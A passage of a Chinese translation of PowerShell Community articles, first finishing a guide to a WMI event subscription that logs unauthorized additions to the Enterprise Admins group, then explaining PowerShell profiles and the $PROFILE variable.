<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>因此，在创建事件查询、事件过滤器、事件消费者和消费者绑定过滤器之后，您可以测试您的工作。 最简单的测试方法是向组中添加一个新用户。 然后，等待几秒钟让 WMI 处理事件，然后查看输出。 如果一切正常，您应该会看到以下输出：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> &gt; <span class="comment"># 9. Adding a user to the Enterprise Admins group</span></span><br><span class="line"><span class="built_in">PS</span> &gt; <span class="built_in">Add-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;Enterprise admins&#x27;</span> <span class="literal">-Members</span> Malcolm</span><br><span class="line"><span class="built_in">PS</span> &gt; </span><br><span class="line"><span class="built_in">PS</span> &gt; <span class="comment"># 10. Viewing the Grouplog.txt file</span></span><br><span class="line"><span class="built_in">PS</span> &gt; <span class="built_in">Get-Content</span> <span class="literal">-Path</span> C:\Foo\Grouplog.txt</span><br><span class="line">On:  [<span class="number">04</span>/<span class="number">20</span>/<span class="number">2021</span> <span class="number">15</span>:<span class="number">41</span>:<span class="number">49</span>]  <span class="built_in">Group</span> [<span class="type">Enterprise</span> <span class="type">Admins</span>] was changed</span><br><span class="line"></span><br><span class="line">Name          DistinguishedName</span><br><span class="line">----          -----------------</span><br><span class="line">Malcolm       CN=Malcolm,OU=IT,DC=Reskit,DC=Org</span><br><span class="line">Jerry Garcia  CN=Jerry Garcia,OU=IT,DC=Reskit,DC=Org</span><br><span class="line">Administrator CN=Administrator,CN=Users,DC=Reskit,DC=Org</span><br><span class="line"></span><br><span class="line">Unauthorized user [<span class="type">Malcolm</span>] added to Enterprise Admins</span><br><span class="line">**********************************</span><br></pre></td></tr></table></figure>

<h3 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h3><p>这段代码当然应该“正常工作”。 如果没有，您需要执行故障排除，需要检查以下三点：</p>
<ul>
<li>WQL 查询是否正确？</li>
<li>事件和订阅类是否在您认为它们所在的命名空间中？</li>
<li><code>Monitor.ps1</code> 脚本是否在执行您真正想要的操作？</li>
</ul>
<p><strong>Microsoft-Windows-WMI-Activity/Operational</strong> 事件日志可用于跟踪问题。 如果您遇到困难，请随时访问 <a href="https://community.spiceworks.com/programming/powershell">Spiceworks PowerShell 论坛</a>。</p>
<h3 id="删除WMI事件相关实例"><a href="#删除WMI事件相关实例" class="headerlink" title="删除WMI事件相关实例"></a>删除WMI事件相关实例</h3><p>当你不想使用这个 WMI 筛选器时，请确保进行清理。 如果你不希望过滤器永远运行，尽快将其删除。 要删除它，请调用 <code>Remove-WMIPE</code> 函数。 您现在应该能从 Enterprise Admins 组中删除任何不合适的用户：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 11. Tidying up</span></span><br><span class="line"><span class="built_in">Remove-WMIPE</span>    <span class="comment"># invoke this function you defined above</span></span><br><span class="line"><span class="variable">$RGMHT</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">  Identity = <span class="string">&#x27;Enterprise Admins&#x27;</span></span><br><span class="line">  Member   = <span class="string">&#x27;Malcolm&#x27;</span></span><br><span class="line">  Confirm  = <span class="variable">$false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Remove-ADGroupMember</span> @RGMHT</span><br></pre></td></tr></table></figure>

<p>此步骤不产生任何输出。 您需要再次调用 <code>Get-WMIPE</code> 以验证您是否已删除所有三个类的实例。</p>
<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>WMI 事件非常强大且易于实现。 您可以订阅数以千计的 WMI 事件，它们可能有助于排除活动故障。 像这篇文章中的案例，检查 AD 组的未授权更改者。 WMI 文档没有提供您可能感兴趣的事件的权威指南——至少我没能找到。</p>
<p>有关在 PowerShell 7 中使用 WMI 的更多详细信息，请参阅我最近出版的 <a href="https://www.wiley.com/en-gb/PowerShell+7+for+IT+Professionals-p-9781119644705">PowerShell 7</a> 一书。 我将第 9 章专门介绍 WMI 和使用 CIM cmdlet。 您可以从这篇博文和我的 [GitHub 存储库](<a href="https://github.com/doctordns/Wiley20/tree/master/09">https://github.com/doctordns/Wiley20/tree/master/09</a> - WMI) 中的那一章中找到脚本。</p>
<h3 id="WMI事件案例"><a href="#WMI事件案例" class="headerlink" title="WMI事件案例"></a>WMI事件案例</h3><p><a href="https://devblogs.microsoft.com/powershell-community/how-can-i-be-notified-any-time-a-service-goes-down/">https://devblogs.microsoft.com/powershell-community/how-can-i-be-notified-any-time-a-service-goes-down/</a></p>
<p>作业：如何监控系统新增计划任务。</p>
<h2 id="如何使用-PowerShell-配置文件"><a href="#如何使用-PowerShell-配置文件" class="headerlink" title="如何使用 PowerShell 配置文件"></a>如何使用 PowerShell 配置文件</h2><p>问题：我想个性化 PowerShell 的工作方式。 我听说我可以使用一种称为配置文件的东西来执行此操作，但是当我尝试查找有关配置文件的信息时，却一无所获。 没有 <code>New-Profile</code> cmdlet，所以我不知道如何创建这样的东西。 你能帮我吗？</p>
<p>解答：配置文件是 PowerShell 的一个强大部分，允许您为您的环境自定义 PowerShell。 它们易于创建并支持一系列部署方案。</p>
<h3 id="什么是powershell配置文件？"><a href="#什么是powershell配置文件？" class="headerlink" title="什么是powershell配置文件？"></a>什么是powershell配置文件？</h3><p>在解释配置文件之前，让我们先检查一下 PowerShell 主机。 PowerShell 主机是托管 PowerShell 以允许您使用它的程序。 常见的 PowerShell 主机包括 Windows PowerShell 控制台、Windows PowerShell ISE、PowerShell 7 控制台和 VS 代码。 每个主机都支持使用配置文件。</p>
<p>配置文件是 PowerShell 主机在您每次启动该 PowerShell 主机时自动加载和执行的 PowerShell 脚本文件。 该脚本实际上是点源（dot-sourced）的，因此您在配置文件脚本中定义的任何变量、函数等在 PowerShell 会话中仍然可用，这非常方便。 我使用配置文件来创建 PowerShell 驱动器、各种有用的变量和一些有用的（对我来说！）函数。</p>
<p>每个 PowerShell 主机都有 4 个单独的配置文件，如下所示：</p>
<ul>
<li>对这个主机，这个用户</li>
<li>对这个主机，所有用户</li>
<li>所有主机，该用户</li>
<li>所有主机，所有用户</li>
</ul>
<p>为什么这么多，你可能会问。 因为拥有这四个配置文件可以为您提供大量部署机会。 例如，您可以拥有一个配置文件，为机器上的每个 PowerShell 主机和用户定义公司别名或标准 PS 驱动器。 您可以拥有“此主机”配置文件，这些配置文件定义了特定于主机的自定义项，这些自定义项可能因 PowerShell 主机而异。 例如，在我的 VS 代码配置文件中，我使用 Set-PSReadLineOption 根据我使用的颜色主题设置标记颜色。 与 PowerShell 中的许多事情一样，PowerShell 团队为您在部署 PowerShell 和 PowerShell 主机时可能遇到的每个场景设计了配置文件。</p>
<p>实际上，“此主机、此用户”配置文件是您最常用的配置文件，但同时拥有这四种配置文件可提供相当大的部署灵活性。 你可以自行选择！</p>
<h3 id="我怎么找到它们"><a href="#我怎么找到它们" class="headerlink" title="我怎么找到它们"></a>我怎么找到它们</h3><p>另一个常见问题是：这些文件在哪里，它们是如何命名的？ 事实证明，就像 PowerShell 的许多事情一样，您可以在 PowerShell 本身中找到问题的答案。 在本例中，在 PowerShell 自动变量 <code>**$PROFILE**</code> 中。</p>
<p>PowerShell 中的自动变量，是由 PowerShell 自己创建并可供使用的变量。 这些变量是在您启动主机时由 PowerShell 创建的。 有关自动变量的更多详细信息，请参阅<a href="https://docs.microsoft.com/powershell/module/microsoft.powershell.core/about/about_automatic_variables">自动变量帮助文本</a>。</p>
<h3 id="PROFILE-变量"><a href="#PROFILE-变量" class="headerlink" title="$PROFILE 变量"></a>$PROFILE 变量</h3><p><code>**$PROFILE**</code> 变量是 PowerShell 在启动期间在每个会话中创建的自动变量。 这个变量有一个 <code>ToString()</code> 方法和四个额外的注释属性，告诉你这个主机在哪里找到它的配置文件。</p>
<p>要确定四个 PowerShell 脚本的位置和填充脚本名称，您可以执行如下操作：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="comment"># what host?   </span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$host</span>.Name</span><br><span class="line">ConsoleHost</span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="comment"># Where are the profiles?</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$PROFILE</span> | <span class="built_in">Get-Member</span> <span class="literal">-MemberType</span> NoteProperty </span><br><span class="line">   TypeName: System.String</span><br><span class="line">Name                   MemberType   Definition</span><br><span class="line">----                   ----------   ----------</span><br><span class="line">AllUsersAllHosts       NoteProperty string AllUsersAllHosts=C:\Program Files\PowerShell\<span class="number">7</span>\profile.ps1</span><br><span class="line">AllUsersCurrentHost    NoteProperty string AllUsersCurrentHost=C:\Program Files\PowerShell\<span class="number">7</span>\Microsoft.PowerShell_profile.ps1</span><br><span class="line">CurrentUserAllHosts    NoteProperty string CurrentUserAllHosts=C:\Users\doctordns\Documents\PowerShell\profile.ps1</span><br><span class="line">CurrentUserCurrentHost NoteProperty string CurrentUserCurrentHost=C:\Users\doctordns\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="comment"># What does the $PROFILE variable itself contain?</span></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$PROFILE</span></span><br><span class="line">C:\Users\doctordns\Documents\PowerShell\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></figure>

<p>此示例来自在 VS Code 中运行 PowerShell 7 的 Windows 10 客户端。 在示例中，您可以看到 <code>**$PROFILE**</code> 变量包含四个注释属性，其中包含每个配置文件的位置。此外，您可以看到 <code>**$PROFILE**</code> 变量的值是 <strong>CurrentUserCurrentHost</strong> 配置文件的名称。 为简单起见，您可以运行 <code>Notepad $Profile</code> 以在记事本中调出配置文件（或使用 VS Code！）</p>
<h3 id="您可以在配置文件脚本中做什么？"><a href="#您可以在配置文件脚本中做什么？" class="headerlink" title="您可以在配置文件脚本中做什么？"></a>您可以在配置文件脚本中做什么？</h3><p>您几乎可以在配置文件中做任何您想做的事情来创建最适合您的环境。 我发现该配置文件对于创建变量和短别名、PS 驱动器等非常有用，如下所示。 作为您可以在配置文件中执行的操作的示例，为了让您入门，我已将两个示例配置文件文件发布到 GitHub：</p>
<ul>
<li><a href="https://github.com/doctordns/PACKT-PS7/blob/master/scripts/goodies/Microsoft.PowerShell_Profile.ps1">A profile for the PowerShell 7 console</a></li>
<li><a href="https://github.com/doctordns/PACKT-PS7/blob/master/scripts/goodies/Microsoft.VSCode_profile.ps1">A profile for VSCode</a></li>
</ul>
<p>这些样本做了很多有用的事情，包括：</p>
<ul>
<li>覆盖一些默认参数值</li>
<li>更新格式枚举限制</li>
<li>将“主”目录设置为非标准位置</li>
<li>创建个人别名</li>
<li>创建 PowerShell 凭据对象</li>
</ul>
<p>这些都是根据您的喜好定制环境的东西。 我使用一些个人别名作为标准别名的替代品——如果只是为了节省打字时间。 创建个人变量或更新自动变量可能很有用。</p>
<p>虽然创建凭证对象可能很有用，但它是否是一件好事还有待商榷。 在这种情况下，凭据适用于我在<a href="https://smile.amazon.co.uk/Windows-Server-Automation-PowerShell-Cookbook-ebook/dp/B0977JDL7K/ref=sr_1_1?dchild=1&keywords=Windows+Server+Automation+with+PowerShell+Cookbook+-+Fourth+Edition&qid=1624277697&s=books&sr=1-1">最近的 PowerShell 书</a>中使用的一组 VM，以说明如何在企业中使用 PowerShell。 由于它们都是本地 VM 且仅用于测试，因此创建一个常用的凭据对象很有用。</p>
<h3 id="需要注意"><a href="#需要注意" class="headerlink" title="需要注意"></a>需要注意</h3><p>配置文件很容易让人忘乎所以。 在 PowerShell 3.0 时代的某一时刻，我的配置文件超过 700 行。 我刚刚放弃了我在 Internet 上找到的所有这些很酷的东西（并且再也没有使用过它们）因此，启动 PowerShell 或 ISE 花了一些时间。 很容易看到一些很酷的代码，然后将其添加到您的个人资料中。 我建议您定期仔细查看每个配置文件，并在可能的情况下对其进行修整。</p>
<h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>配置文件是可用于自定义 PowerShell 环境的 PowerShell 脚本。 每个主机有 4 个配置文件，您可以通过检查 <code>**$Profile**</code> 自动变量看到。</p>
]]></content>
      <categories>
        <category>钓鱼</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>PowerShell Community</tag>
      </tags>
  </entry>
</search>
